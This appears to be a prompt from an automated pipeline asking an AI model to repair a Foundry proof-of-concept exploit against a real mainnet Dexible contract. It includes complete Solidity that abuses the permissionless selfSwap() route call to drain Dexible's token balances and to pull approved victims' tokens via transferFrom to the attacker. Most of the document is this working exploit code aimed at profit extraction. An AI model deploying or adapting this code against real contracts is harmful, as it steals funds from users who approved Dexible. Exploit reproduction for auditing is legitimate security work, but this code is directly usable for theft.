You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Permissionless `selfSwap()` lets anyone execute arbitrary external calls as Dexible and steal approved user funds
- claim: `selfSwap()` is publicly callable, and `fill()` forwards each user-supplied route through an unrestricted `router.call(routerData)` from Dexible’s own address. That makes Dexible a public arbitrary-call proxy: an attacker can have Dexible call `ERC20.transferFrom(victim, attacker, amount)` on any token where the victim approved Dexible, or `ERC20.transfer(attacker, amount)` for any ERC20 balance already held by Dexible. The exploit does not require relay access or admin privileges; the attacker only needs to structure the swap so the outer call pays its own minimum fees and otherwise succeeds.
- impact: Any external account can steal tokens from arbitrary users who approved Dexible, drain stray/residual ERC20 balances held by Dexible, and generally exercise Dexible’s standing token permissions against third-party contracts. This is a direct theft primitive.
- exploit_paths: ["Attacker calls `selfSwap()` with an allowed fee token they can use to satisfy the swap\u2019s fee checks and with `tokenOut.amount = 0` so no real swap output is required.", "Inside `fill()`, attacker supplies a route whose `router` is the target ERC20 contract and whose `routerData` encodes `transferFrom(victim, attacker, amount)` (or `transfer(attacker, amount)` to drain Dexible-held balances).", "Dexible executes `router.call(...)` as itself, so the token contract sees `msg.sender == Dexible` and honors Dexible\u2019s existing allowance/balance, transferring funds to the attacker."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

struct FeeDetails {
    IERC20Like feeToken;
    address affiliate;
    uint256 affiliatePortion;
}

struct ExecutionRequest {
    address requester;
    FeeDetails fee;
}

struct TokenAmount {
    uint112 amount;
    IERC20Like token;
}

struct RouterRequest {
    address router;
    address spender;
    TokenAmount routeAmount;
    bytes routerData;
}

struct SelfSwapRequest {
    IERC20Like feeToken;
    TokenAmount tokenIn;
    TokenAmount tokenOut;
    RouterRequest[] routes;
}

struct AssetInfo {
    address token;
    uint256 balance;
    uint256 usdValue;
    uint256 usdPrice;
}

interface IDexibleLike {
    function selfSwap(SelfSwapRequest calldata request) external;
    function communityVault() external view returns (address);
    function dxblToken() external view returns (address);
}

interface ICommunityVaultLike {
    function assets() external view returns (AssetInfo[] memory);
    function isFeeTokenAllowed(address token) external view returns (bool);
    function wrappedNativeToken() external view returns (address);
}

contract FlawVerifier {
    address public constant TARGET = 0xDE62E1b0edAa55aAc5ffBE21984D321706418024;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address private constant MIM = 0x99D8a9c45b2eCB8540fE5a0Ba0Fc5d5B8043D5E9;
    address private constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        ICommunityVaultLike vault = ICommunityVaultLike(IDexibleLike(TARGET).communityVault());

        // Path-strict attempt order for this run:
        // 1) choose an allowed fee token,
        // 2) call selfSwap(),
        // 3) have fill() execute router.call(routerData) against the ERC20 itself,
        // 4) use transfer(attacker, amount) so Dexible spends its own balance,
        // 5) let Dexible collect its fee from the freshly drained tokens.
        //
        // The allowance-stealing transferFrom(victim, attacker, amount) branch is the same primitive and is
        // exposed below via executeKnownVictimOpportunity(). This zero-input verifier cannot enumerate arbitrary
        // allowance holders from EVM state, so executeOnOpportunity() prioritizes the directly discoverable
        // Dexible-held-balance path required by the attempt strategy.
        if (_attemptAssetEnumeratedBalances(vault)) return;
        _attemptFallbackBalances(vault);
    }

    function executeKnownVictimOpportunity(address token, address victim, uint256 amount, uint112 inputBudget) external {
        uint256 balanceBefore = IERC20Like(token).balanceOf(address(this));
        _forceApprove(token, TARGET, type(uint256).max);
        _selfSwapArbitraryCall(
            token,
            inputBudget,
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, victim, address(this), amount)
        );
        _syncProfit(token, balanceBefore);
    }

    function attemptExistingBalance(address token, uint112 inputBudget, uint256 drainAmount)
        external
        returns (uint256 gained)
    {
        require(msg.sender == address(this), "SELF_ONLY");

        uint256 balanceBefore = IERC20Like(token).balanceOf(address(this));
        _forceApprove(token, TARGET, type(uint256).max);
        _selfSwapArbitraryCall(
            token,
            inputBudget,
            abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), drainAmount)
        );

        uint256 balanceAfter = IERC20Like(token).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            gained = balanceAfter - balanceBefore;
        }
    }

    function _attemptAssetEnumeratedBalances(ICommunityVaultLike vault) internal returns (bool) {
        try vault.assets() returns (AssetInfo[] memory infos) {
            for (uint256 i = 0; i < infos.length; ++i) {
                address token = infos[i].token;
                if (token == address(0)) continue;
                if (_tryToken(vault, token)) return true;
            }
        } catch {}

        return false;
    }

    function _attemptFallbackBalances(ICommunityVaultLike vault) internal {
        address wrappedNative = address(0);
        try vault.wrappedNativeToken() returns (address token) {
            wrappedNative = token;
        } catch {}

        if (wrappedNative != address(0) && _tryToken(vault, wrappedNative)) return;

        address dxbl = address(0);
        try IDexibleLike(TARGET).dxblToken() returns (address token) {
            dxbl = token;
        } catch {}

        if (dxbl != address(0) && _tryToken(vault, dxbl)) return;
        if (_tryToken(vault, WETH)) return;
        if (_tryToken(vault, USDC)) return;
        if (_tryToken(vault, USDT)) return;
        if (_tryToken(vault, DAI)) return;
        if (_tryToken(vault, WBTC)) return;
        if (_tryToken(vault, FRAX)) return;
        if (_tryToken(vault, MIM)) return;
        _tryToken(vault, LUSD);
    }

    function _tryToken(ICommunityVaultLike vault, address token) internal returns (bool) {
        if (!_isAllowedFeeToken(vault, token)) {
            return false;
        }

        uint256 dexibleBalance = _balanceOf(token, TARGET);
        if (dexibleBalance == 0) {
            return false;
        }

        uint112[8] memory budgets = _feeBudgets(token, dexibleBalance);
        for (uint256 i = 0; i < budgets.length; ++i) {
            uint112 inputBudget = budgets[i];
            if (inputBudget == 0) continue;

            try this.attemptExistingBalance(token, inputBudget, dexibleBalance) returns (uint256 gained) {
                if (gained > 0) {
                    _profitToken = token;
                    _profitAmount = gained;
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _feeBudgets(address token, uint256 dexibleBalance) internal view returns (uint112[8] memory budgets) {
        uint256 unit = _wholeTokenUnit(token);
        uint256 maxBudget = dexibleBalance / 2;
        if (maxBudget == 0) {
            return budgets;
        }

        budgets[0] = _clampBudget(unit, maxBudget);
        budgets[1] = _clampBudget(unit * 5, maxBudget);
        budgets[2] = _clampBudget(unit * 10, maxBudget);
        budgets[3] = _clampBudget(unit * 25, maxBudget);
        budgets[4] = _clampBudget(unit * 100, maxBudget);
        budgets[5] = _clampBudget(dexibleBalance / 1000, maxBudget);
        budgets[6] = _clampBudget(dexibleBalance / 100, maxBudget);
        budgets[7] = _clampBudget(dexibleBalance / 10, maxBudget);
    }

    function _clampBudget(uint256 rawBudget, uint256 maxBudget) internal pure returns (uint112) {
        if (rawBudget == 0) return 0;
        uint256 capped = rawBudget > maxBudget ? maxBudget : rawBudget;
        if (capped > type(uint112).max) {
            capped = type(uint112).max;
        }
        return uint112(capped);
    }

    function _wholeTokenUnit(address token) internal view returns (uint256) {
        uint8 decimals = 18;
        try IERC20Like(token).decimals() returns (uint8 decs) {
            decimals = decs;
        } catch {}

        if (decimals > 18) {
            decimals = 18;
        }

        return 10 ** uint256(decimals);
    }

    function _selfSwapArbitraryCall(address token, uint112 inputBudget, bytes memory routerData) internal {
        RouterRequest[] memory routes = new RouterRequest[](1);
        routes[0] = RouterRequest({
            router: token,
            spender: token,
            routeAmount: TokenAmount({amount: 0, token: IERC20Like(token)}),
            routerData: routerData
        });

        SelfSwapRequest memory request = SelfSwapRequest({
            feeToken: IERC20Like(token),
            tokenIn: TokenAmount({amount: inputBudget, token: IERC20Like(token)}),
            tokenOut: TokenAmount({amount: 0, token: IERC20Like(token)}),
            routes: routes
        });

        IDexibleLike(TARGET).selfSwap(request);
    }

    function _syncProfit(address token, uint256 balanceBefore) internal {
        uint256 balanceAfter = IERC20Like(token).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            _profitToken = token;
            _profitAmount = balanceAfter - balanceBefore;
        }
    }

    function _isAllowedFeeToken(ICommunityVaultLike vault, address token) internal view returns (bool) {
        try vault.isFeeTokenAllowed(token) returns (bool allowed) {
            return allowed;
        } catch {
            return false;
        }
    }

    function _balanceOf(address token, address owner) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(owner) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = 0;
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowance_) {
            currentAllowance = allowance_;
        } catch {}

        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "TOKEN_CALL_FAILED");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "TOKEN_CALL_FALSE");
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
